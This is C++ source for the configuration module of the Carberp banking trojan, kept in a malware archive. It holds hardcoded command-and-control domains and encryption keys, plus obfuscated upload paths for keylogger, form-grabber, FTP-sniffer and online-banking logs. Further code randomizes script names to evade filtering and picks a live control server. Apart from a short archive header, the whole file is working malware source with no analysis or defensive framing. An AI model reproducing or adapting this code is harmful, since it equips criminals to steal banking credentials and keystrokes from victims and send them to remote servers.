/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
//#include <shlobj.h>

#include "Config.h"
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotCore.h"


#include "Modules.h"

//#include "BotDebug.h"

namespace CONFIGDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define CFGDBG CONFIGDEBUGSTRINGS::DBGOutMessage<>



//**********************************************
char BOT_VERSION_BUF[] = BOT_VERSION_HEADER    BOT_VERSION;




//----------------------------------------------------------------------------
// ��� ��� �����.
// ����� ����������� �� LoaderDll � �������.
// �������� ��������� ��� ���������� ������� ���������� �����.
// � ����� �������� ��� ���������� �� ������ ����� ��� ����������.
//----------------------------------------------------------------------------
char BotPlugName[MAX_BOT_PLUG_NAME_SIZE] = BOTPARAM_PLUG_NAME;



#ifndef DEBUGCONFIG
//=============================================================================
//  ��������� ������� ������ ���� ����� �������� ����
//=============================================================================


	//****************************************************************************
	//  ������ ������.
	//  ���������� ������ ����� ������, ��� ����������, �����, ������������
	//
	//  ������ ���� ������ �������������� ������� ��������, ����� ���������� �����
	//  ������ ������ ��� ������� �������. �� ����������� ������� ��������������
	//  ������� - �������, ��������� � �.�
	//
	//  host1.com\0host2.com\0host3.com\0\0
	//****************************************************************************
	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = BOTPARAM_MAINHOSTS;

	//****************************************************************************
	//  ����� �������� ������ ��� �������� �����
	//****************************************************************************

	#ifdef USE_BANKING_HOSTS
    	char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = BOTPARAM_BANKHOSTS;
    #endif
	//----------------------------------------------------------------------------
	// �������� ������� (� �������). ��������� ��������
	//----------------------------------------------------------------------------
	char Delay[MAX_DELAY_SIZE + 1]  = BOTPARAM_DELAY;

	//----------------------------------------------------------------------------
	// ������� ����
	//----------------------------------------------------------------------------
	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = BOTPARAM_PREFIX;

	//----------------------------------------------------------------------------
	// �������� ������ ����. ���� ������ ����� ����������� ���� �������
	//----------------------------------------------------------------------------
	char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;
//=============================================================================
#else

	//  ����� ������ ���� � ����� ������ � �����


    // ��� ������ �������
//	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "4lordfg.info\0";
//	char MainPassword[MAX_PASSWORD_SIZE + 1] = "jCPSJ0vXgdBaD5kA";


//	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "arekov.com\0";
//	char MainPassword[MAX_PASSWORD_SIZE + 1] = "rGV01X8JFAfjcwTh";


	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
	char MainPassword[MAX_PASSWORD_SIZE + 1] = "bRS8yYQ0APq9xfzC";
	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "bktest";
	char Delay[MAX_DELAY_SIZE + 1]       = "1";



	#ifdef USE_BANKING_HOSTS
		char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zika.in\0";
	#endif

#endif


//----------------------------------------------------------------------------
// ������� ���� ����������� � ������ BANKING
//----------------------------------------------------------------------------

#ifdef USE_BANKING_PREFIX
	char BOT_PREFIX_BANK[] = "banking";
#endif


//--------------------------------------------
//  ������ ���������� �����
//--------------------------------------------
char SESSION_PASSWORD[MAX_SESSION_PASSW_SIZE + 1] = BOTPARAM_SESSION_PASSW;


//----------------------------------------------------------------------------
// ����������� ������, ����� �������������� ������ � �������
// ����� ��������� �������� ������, �� �� �� ������
//----------------------------------------------------------------------------
const char DefaultPassword[] = "K8DFaGYUs83KF05T";



// ������ ��������
#ifndef CryptHTTPH
	const static char PathTask[]        = {'/','s','e','t','/','t','a','s','k','.','h','t','m','l', 0};
	const static char PathFirstInfo[]   = {'/','s','e','t','/','f','i','r','s','t','.','h','t','m','l',0};
	const static char PathFormGrabber[] = {'/','g','e','t','/','f','g','r','.','h','t','m','l',0};
	const static char PathFTPSniffer[]  = {'/','g','e','t','/','s','n','i','.','h','t','m','l',0};
	const static char PathGrabber[]     = {'/','g','e','t','/','g','r','a','.','h','t','m','l',0};
	const static char PathComment[]     = {'/', 's', 'e', 't', '/', 'c', 'o', 'm', 'm', 'e', 'n', 't', '.', 'h', 't', 'm', 'l',  0};
	const static char PathPluginsList[] = {'/', 's', 'e', 't', '/', 'c', 'f', 'g', 's', '.', 'h', 't', 'm', 'l',  0};
	const static char PathKeylogger[]   = {'/', 'g', 'e', 't', '/', 'k', 'e', 'y', '.', 'h', 't', 'm', 'l',  0};
    const static char PathCab[]         = {'/','g','e','t','/','c','a','b','.','h','t','m','l' ,0};
	const static char PathPlugins[]     = {'/','s','e','t','/','p','l','u','g','s','.','h','t','m','l',0};

	#ifdef IBankSystemH
		const static char PathIBank[]   = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
    #endif

	#ifdef HunterH
		const static char PathHunter[]  = {'/','s','e','t','/','h','u','n','t','e','r','.','h','t','m','l',0};
	#endif
#endif

const static char PathConfig[]      = {'/','c','f','g','/',0};
const static char PathRemoteLog[]   = {'/','p','a','t','/','s','c','r','l','.','h','t','m','l', 0};


// ���������� ��������� ��� ����� SET
const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z", NULL};

// ���������� ��������� ��� ����� GET
const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar", NULL};

// ������ ���������� �������� ����������
const static PCHAR UpdateScriptsExts[] = {".pif", ".db", ".log", NULL};



const static char HTTPProtocol[] = "http://";


//--------------------------------------------
//  GetBotVersion - ������� ���������� ������
//                  � ������� ����
//--------------------------------------------
PCHAR GetBotVersion()
{
	PCHAR Result = BOT_VERSION_BUF;
    // ���������� ���������
	Result += BOT_VERSION_HEADER_SIZE;
	return Result;
}


//------------------------------------------------------------------
//  GetBotHosts - ������� ���������� ��������� �� ������ ������ ����
//------------------------------------------------------------------
PCHAR GetBotHosts()
{
	return BOT_MAINHOSTS_ARRAY;
}
//----------------------------------------------------------------------------


void SetBankingMode(bool IsBanking)
{
	#ifdef USE_BANKING_PREFIX
		string FileName = GetBankingModeFileName();
		if (!FileName.IsEmpty())
		{
			if (IsBanking)
				File::WriteBufferA(FileName.t_str(), FileName.t_str(), 3);
			else
				pDeleteFileA(FileName.t_str());
			GenerateUid(BOT_UID);
		}
	#endif
}
//-----------------------------------------------------------------------------

bool IsBankingMode()
{
	// ������� ���������� ������ ���� ������� ����� "����"
	// � ���� ������ ��������� ���� ����� ���������� �� �������
    #ifdef USE_BANKING_PREFIX
		string FileName = GetBankingModeFileName();
		return FileExistsA(FileName.t_str());
	#else
		return false;
	#endif
}
//-----------------------------------------------------------------------------

#ifdef USE_BANKING_PREFIX
	string GetBankingModeFileName()
	{
		// ������� ���������� ��� ����������� �����
		// ��� ����������� ��������

		string Path(MAX_PATH);
		if (!SHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE))
			return NULLSTR;
		Path.CalcLength();

		Path += "\\";
		Path += BANKING_SIGNAL_FILE;

		return Path;
	}
	//-----------------------------------------------------------------------------

#endif



//****************************************************
//  �������� ������������� �������� �� �����
//
//  � ������ ������ ���������� ��� ����� �������
//
//  ��� ��������� ������������� ������ �� �����
//  �� ������������� �������� ������������� �����
//  ��������
//****************************************************
#if !defined(USE_PREFIX_FILE) && defined(BotHostsH)
	#define USE_PREFIX_FILE
#endif



string GetPrefix(bool CheckBankingMode)
{
	// ������� ���������� ������� ����

	#ifdef USE_BANKING_PREFIX
		// ���� ������� ����� ������� ����������
		// ������� �������
		if (CheckBankingMode && IsBankingMode())
			return BOT_PREFIX_BANK;
	#endif

	string Prefix;

	#ifdef USE_PREFIX_FILE
		LoadPrefixFromFile(Bot->PrefixFileName().t_str());
	#endif

	if (Prefix.IsEmpty())
	{
		Prefix = BOT_PREFIX;
		if (BOTPARAM_ENCRYPTED_PREFIX)
			DecryptStr(Prefix.t_str(), Prefix.t_str());
    }

    return Prefix;
}


//-----------------------------------------------------------------------------
#ifdef CryptHTTPH
	PCHAR GetScriptByID(DWORD ID, bool &Created)
	{
		// ������� ���������� ������ �������� � ������ ����, �������
		// ������������ ���������� � ������ �������
		Created = false;
		DWORD Min1, Max1, Min2, Max2;
		bool IsGetScript = false;
		PCHAR *Exts = NULL;

		#define RANGE(IsGet, Mn1, Mx1, Mn2, Mx2) {Min1 = Mn1; Max1 = Mx1; \
												  Min2 = Mn2; Max2 = Mx2; \
												  IsGetScript = IsGet; \
												  break;}

        // ���������� ������� �������
		switch (ID) {
			// ������� �� ����� GET
			case SCRIPT_FORM_GRABBER: RANGE(true, 1, 3, 24, 26);
			case SCRIPT_GRABBER:      RANGE(true, 4, 6, 27, 30);
			case SCRIPT_FTP_SNIFFER:  RANGE(true, 7, 9, 31, 33);
			case SCRIPT_CAB:          RANGE(true, 10, 12, 34, 36);
//            case SCRIPT_CAB_PART:     RANGE(true, 13, 15, 37, 39);
			case SCRIPT_KEYLOGGER:    RANGE(true, 16, 18, 40, 42);
			case SCRIPT_IBANK_LOG:    RANGE(true, 19, 21, 43, 45);
//			case SCRIPT_SCREENSHOT:   RANGE(true, 22, 24, 46, 48);

			// ������� �� ����� SET
			case SCRIPT_TASK:         RANGE(false, 1, 6, 18, 24);
			case SCRIPT_FIRST_INFO:   RANGE(false, 7, 12, 25, 30);
			case SCRIPT_PLUGINS:      RANGE(false, 13, 17, 31, 36);
			case SCRIPT_COMMENT:      RANGE(false, 37, 48, 37, 48);
			case SCRIPT_HUNTER:       RANGE(false, 49, 56, 48, 56);
			case SCRIPT_PLUGINS_LIST: RANGE(false, 57, 64, 57, 64);
			case SCRIPT_REMOTE_LOG:   return (PCHAR)PathRemoteLog;
			case SCRIPT_PLUGIN:       Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 16, 18, 16, 18);


			// ������ �� ������� ����������
			case SCRIPT_UPDATE_HOSTS: Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 7, 9, 7, 9);
			case SCRIPT_UPDATE_BOT:   Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 10, 12, 10, 12);

		default:
			return NULL;
		}


		// ���������� ����
        Created = true;
		// ������������� ����������
		if (!Exts)
		{
			if (IsGetScript)
				Exts = (PCHAR*)&GETFolderExts[0];
			else
				Exts = (PCHAR*)&SETFolderExts[0];
		}

		return GenerateRandomScript(Min1, Max1, Min2, Max2, Exts);

	}
//-----------------------------------------------------------------------------

#else

	PCHAR GetScriptByID(DWORD ID, bool &Created)
	{
		// ������� ���������� ������ �������� � ������ ����, ������� ��
		// ������������ ����������
		Created = false;
		switch (ID)
		{
			case SCRIPT_FORM_GRABBER: return (PCHAR)PathGrabber;
			case SCRIPT_TASK:         return (PCHAR)PathTask;
			case SCRIPT_FIRST_INFO:   return (PCHAR)PathFirstInfo;
			case SCRIPT_PLUGINS:      return (PCHAR)PathPlugins;
			case SCRIPT_FTP_SNIFFER:  return (PCHAR)PathFTPSniffer;
			case SCRIPT_GRABBER:      return (PCHAR)PathGrabber;

			#ifdef HunterH
			case SCRIPT_HUNTER: return (PCHAR)PathHunter;
			#endif

			#ifdef IBankSystemH
			case SCRIPT_IBANK_LOG: return (PCHAR)PathIBank;
			#endif

			case SCRIPT_COMMENT:      return (PCHAR)PathComment;
			case SCRIPT_PLUGINS_LIST: return (PCHAR)PathPluginsList;
			case SCRIPT_KEYLOGGER:    return (PCHAR)PathKeylogger;
			case SCRIPT_CAB:          return (PCHAR)PathCab;
			case SCRIPT_REMOTE_LOG:   return (PCHAR)PathRemoteLog;
		}
		return NULL;

	}

#endif
//-----------------------------------------------------------------------------


int GetDelay()
{
	PCHAR Str = NULL;

	if (CalcHash(Delay) != BOTPARAM_HASH_DELAY)
		Str = Delay;


	int V = 0;
	if (Str != NULL)
		V = m_atoi(Str);

	if (V == 0)
		V = DEFAULT_DELAY;

	return V;
}

//-----------------------------------------------------------------------------


string GetActiveHost(bool CheckBankingMode)
{
	// ������� ���������� �������� (���������) ����
	bool FileExists = false;
	string Host;

	#if !defined(DEBUGCONFIG) && defined(BotHostsH)
		PCHAR H  = NULL;

		// ������ ������ �������� �������� ���� �� �����
		if (Hosts::GetActiveHostFormFile(NULL, H, &FileExists))
		{
			Host = H;
			STR::Free(H);

			if (!Host.IsEmpty())
			{
				CFGDBG("Cofig", "�������� ���� �� �����");
				return Host;
            }
		}
	#endif


	// ��������� ����� ��������

	#ifdef USE_BANKING_HOSTS
		if (CheckBankingMode && IsBankingMode())
		{
			Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY, BOTPARAM_HASH_BANKHOSTS, BOTPARAM_ENCRYPTED_BANKHOSTS);
			if (!Host.IsEmpty())
				return Host;
		}
	#endif

	Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);


	if (!Host.IsEmpty() && FileExists)
	{
		// �������������� ��������� ����
        BOT::SaveSettings(true, true, false);
	}

	return Host;
}
//-----------------------------------------------------------------------------


//-------------------------------------------------------------------
//  IsMainHost - ������� ���������� ������ ����
//  ��������� ���� ����������� ������� �������� ������ ����
//-------------------------------------------------------------------
bool IsMainHost(const char* Host)
{

	/* TODO : ������� ��������  � ����� � �������� � ������ BANKING */

	TStrEnum E(BOT_MAINHOSTS_ARRAY, BOTPARAM_ENCRYPTED_MAINHOSTS, BOTPARAM_HASH_MAINHOSTS);
	while (E.Next())
	{
		if (E.Line() == Host)
			return true;
	}
	return false;
}
//-----------------------------------------------------------------------------



//-------------------------------------------------------
// ������� ������������ � ���������� 80 ����� ����������
// �������.
// ����������� ������� ���� � ������ HTTP, ������ ���
// ������������ ���� ������� �������������� �����
//-------------------------------------------------------
SOCKET __ConnectToHost(const char* Host)
{
	// �������������� ����������
	// �������������� ����������
	WSADATA wsa;
	ClearStruct(wsa);
	DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
	if (Code != 0) return INVALID_SOCKET;


	// ��������  ����� �� ����� �����
	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname((const char*)Host);

	if ( lpHost == NULL )
		return SOCKET_ERROR;

	// ��������� ����
	SOCKET Socket = (SOCKET)psocket(AF_INET, SOCK_STREAM, 0);

	if( Socket == SOCKET_ERROR )
		return Socket;

	struct sockaddr_in SockAddr;

	ClearStruct(SockAddr);

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = HTONS((unsigned short)80);

	// ������������ � ������
	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		//int Error = WSAGetLastError();
		pclosesocket( Socket );
		return SOCKET_ERROR;
	}
	return Socket;
}


//-------------------------------------------------------
// ������� ��������� ����������������� ���������� �����
//-------------------------------------------------------
bool CheckHost(const char* Host)
{
  // ������� ��������� ����������������� �����

	if (STRA::IsEmpty(Host))
		return false;

	SOCKET Socket = __ConnectToHost(Host);

	bool Result = (Socket != INVALID_SOCKET);

	pclosesocket(Socket);
	return Result;
}
//-----------------------------------------------------------------------------


PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
{
	//  ������� ���������� ���� �� ������
	if (STR::IsEmpty(Hosts))
    	return NULL;

	if (EmptyArrayHash != 0 && CalcHash(Hosts) == EmptyArrayHash)
	{
		// ����� �� �����
		return NULL;
	}

	PCHAR Host = Hosts;

	while (*Host != 0)
	{
		// ���������� ���� � ��������� ���
		PCHAR Result = STR::New(Host);

		if (BOTPARAM_ENCRYPTED_MAINHOSTS)
			DecryptStr(Host, Result);

		if (CheckHost(Result))
			return Result;

		STR::Free(Result);

		// ��������� �� ������ �������
		Host = STR::End(Host);
		Host++;
	}

	return NULL;
}


string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encrypted)
{
	//  ������� ���������� ���� �� ������
	string Result;

	TStrEnum E(Hosts, Encrypted, EmptyArrayHash);

	while (E.Next())
	{
		if (CheckHost(E.Line().t_str()))
		{
			Result = E.Line();
			break;
		}

	}
	return Result;
}
//-----------------------------------------------------------------------------


//------------------------------------------------------------------
//  SaveHostsToFile - ������� ���������� ����� � ����
//
//  ������� ����� �������� ������ � ������ �������������
//  ����� BotHosts.h
//------------------------------------------------------------------
void SaveHostsToFile(const char* FileName)
{
#ifdef BotHostsH
	if (STRA::IsEmpty(FileName))
		return;

	bool Added = false;
	PHostList List = Hosts::CreateList();

	TStrEnum E(BOT_MAINHOSTS_ARRAY, BOTPARAM_ENCRYPTED_MAINHOSTS, BOTPARAM_HASH_MAINHOSTS);
	while (E.Next())
	{
		Hosts::AddHost(List, E.Line());
		Added = true;
	}

	if (Added)
		Hosts::SaveListToFile(List, (PCHAR)FileName, true);

	Hosts::FreeList(List);
#endif
}
//-----------------------------------------------------------------------------


//------------------------------------------------------------------
//  SavePrefixToFile - ������� ���������� ������� � ����
//------------------------------------------------------------------
void SavePrefixToFile(const char* FileName)
{
	if (STRA::IsEmpty(FileName))
		return;

	string Prefix = BOT_PREFIX;
	if (!BOTPARAM_ENCRYPTED_PREFIX)
	{
		// ��� �������������, ������� �������
		DecryptStr(Prefix.t_str(), Prefix.t_str());
    }
	File::WriteBufferA(FileName, Prefix.t_str(), Prefix.Length());
}
//-----------------------------------------------------------------------------


//------------------------------------------------------------------
//  LoadPrefixFromFile - ������� ��������� ������� �� �����
//------------------------------------------------------------------
string LoadPrefixFromFile(const char* FileName)
{
	DWORD  Sz  = 0;
	PCHAR Buf = (PCHAR)File::ReadToBufferA(FileName, Sz);
	string Prefix(Buf, Sz);
	if (!Prefix.IsEmpty())
    	DecryptStr(Prefix.t_str(), Prefix.t_str());

	return Prefix;
}
//-----------------------------------------------------------------------------


PCHAR GetBotScriptURL(DWORD Script, PCHAR Path, bool CheckBankingMode)
{
	// ������� ���������� ������ ����� �������
	bool PathCreated = false;

	CFGDBG("Cofig", "�������� ����� ������� %d", Script);

	if (STR::IsEmpty(Path))
		Path = GetScriptByID(Script, PathCreated);

	CFGDBG("Cofig", "���� ������� %s", Path);


	PCHAR Result = NULL;

	string Host = GetActiveHost(CheckBankingMode);

	if (!Host.IsEmpty())
	{
		PCHAR Slash = NULL;
		if (Path == NULL || *Path != '/')
        	Slash = "/";

		Result = STR::New(4, (PCHAR)HTTPProtocol, Host.t_str(), Slash, Path);

		CFGDBG("Cofig", "����� �������: %s", Result);
	}
	else
	{
		#ifndef DEBUGCONFIG
			CFGDBG("Cofig", "�� ������� �������� ����. ���������� �������: \r\n%s", BOT_MAINHOSTS_ARRAY);
		#endif
	}

	if (PathCreated)
		STR::Free(Path);

	return Result;
}
//----------------------------------------------------------------------------


// ������� ���������� ������ ��� ����������� �����������/������������ ������

PCHAR GetMainPassword()
{
	// ������� ���������� ������ ����������

	PCHAR Passw = STR::New(MainPassword);
	if (BOTPARAM_ENCRYPTED_PASSWORD)
		DecryptStr(MainPassword, Passw);

	return Passw;
}
//----------------------------------------------------------------------------

string GetMainPassword2(bool NotNULL)
{
	// ������� ���������� ������ ����������
	string Pass;

	// ��������� ����� �� � ���� ������
	if (!STRA::IsEmpty(MainPassword) && STRA::Hash(MainPassword) != BOTPARAM_HASH_PASSWORD)
	{
		Pass = MainPassword;
        if (BOTPARAM_ENCRYPTED_PASSWORD)
			DecryptStr(MainPassword, Pass.t_str());
	}

	// � ������ ������������� ���������� c���������� ������
	if (NotNULL && Pass.IsEmpty())
		Pass = DefaultPassword;

	return Pass;
}
//----------------------------------------------------------------------------

// ������� ���������� ��������� �� ������ ��� ���������� �����
PCHAR GetSessionPassword()
{
	return SESSION_PASSWORD;
}
//----------------------------------------------------------------------------

PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, PCHAR *Exts)
{
	// ������� ���������� ��������� ��� �������
	DWORD Sz = 0;
	if (Random::Generate(0, 1000) < 500)
		Sz = Random::Generate(Min1, Max1);
	else
		Sz = Random::Generate(Min2, Max2);

	PCHAR Name = Random::RandomString(Sz, 'a', 'z');

	// ��������� ���������� �������

	DWORD ExtsCount = 0;
	while (Exts[ExtsCount]) ExtsCount++;


	DWORD ExtPos = Random::Generate(1, ExtsCount);
	ExtPos--;
	PCHAR Ext = *(Exts + ExtPos);

	PCHAR Script = STR::New(3, "/", Name, Ext);

	STR::Free(Name);

    return Script;
}
//----------------------------------------------------------------------------

DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
{
	//  ������� ���������� ������� ����
	if (!Buffer && !BufSize) return 0;

	PCHAR Value;

	switch (ParamID)
	{
		case BOT_PARAM_PREFIX:       Value = BOT_PREFIX;  break;
		case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
		case BOT_PARAM_KEY:          Value = MainPassword; break;
		case BOT_PARAM_DELAY:        Value = Delay; break;
		case BOT_PARAM_BOTPLUGNAME:  Value = BotPlugName; break;
		#ifdef USE_BANKING_HOSTS
			case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
		#endif
		default: return 0;
	}

	// ���������� ������ ���������
	DWORD Size = 0;

	bool ParamIsHosts = ParamID == BOT_PARAM_HOSTS ||
						ParamID == BOT_PARAM_BANKINGHOSTS;

	if (ParamIsHosts)
		Size = STR::CalcDoubleZeroStrLength(Value);
	else
		Size = STRA::Length(Value);

	if (!Buffer) return Size;

	// �������� ��������
	m_memset(Buffer, 0, BufSize);

	if (BufSize < Size)
	{
		if (ParamIsHosts)
            Size = BufSize - 2;
		else
			Size = BufSize - 1;
    }

	DWORD ToCopy = Size;

    m_memcpy(Buffer, Value, ToCopy);

	#ifdef DEBUGCONFIG
		// ������� �������� ������
		if (ParamIsHosts ||
			ParamID == BOT_PARAM_PREFIX ||
			ParamID == BOT_PARAM_KEY)
		{
			DecryptStr(Buffer, Buffer);
		}
	#endif
	return Size;
}
//----------------------------------------------------------------------------

BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
{
	if (STR::IsEmpty(Param))
		return FALSE;

	DWORD Size = 0;    // ������  ���������������� ���������
	LPVOID Buf = NULL; // ������� �����
	DWORD Max  = 0;     // ����������� ���������� ������

	if (ParamID != BOT_PARAM_HOSTS)
		Size = StrCalcLength(Param);

	// ���������� ������� ����� � ������ ���������

	switch (ParamID) {

		// ��������������� ������� ����
		case BOT_PARAM_PREFIX:
			{
				Buf = BOT_PREFIX;
				Max = MAX_PREFIX_SIZE;
				break;
			}

		// ������������� �����
		case BOT_PARAM_HOSTS:
			{
				Size = STR::CalcDoubleZeroStrLength(Param);
				Buf  = BOT_MAINHOSTS_ARRAY;
				Max  = MAX_MAINHOSTS_BUF_SIZE;
				break;
			}

		// ������������� ���� ����������
		case BOT_PARAM_KEY:
			{
				Buf = MainPassword;
				Max = MAX_PASSWORD_SIZE;
				break;
			}

		// ������������� ��������
		case BOT_PARAM_DELAY:
			{
				Buf = Delay;
				Max = MAX_DELAY_SIZE;
				break;
			}

		// ������������� ��� �����
		case BOT_PARAM_BOTPLUGNAME:
			{
				Buf = BotPlugName;
				Max = MAX_BOT_PLUG_NAME_SIZE;
				break;
			}

		// ������������� ����� BANKING ������
		#ifdef USE_BANKING_HOSTS
			case BOT_PARAM_BANKINGHOSTS:
				{
					Buf = BOT_BANKHOSTS_ARRAY;
					Max = MAX_BANKHOSTS_BUF_SIZE;
					break;
				}
		#endif

	default: return FALSE;;
	}


	// ������������� ��������
	if (Size == 0 || Buf == NULL || (Max != 0 && Size > Max))
		return FALSE;

	m_memset(Buf, 0, Max);
	m_memcpy(Buf, Param, Size);
	return TRUE;
}
//----------------------------------------------------------------------------




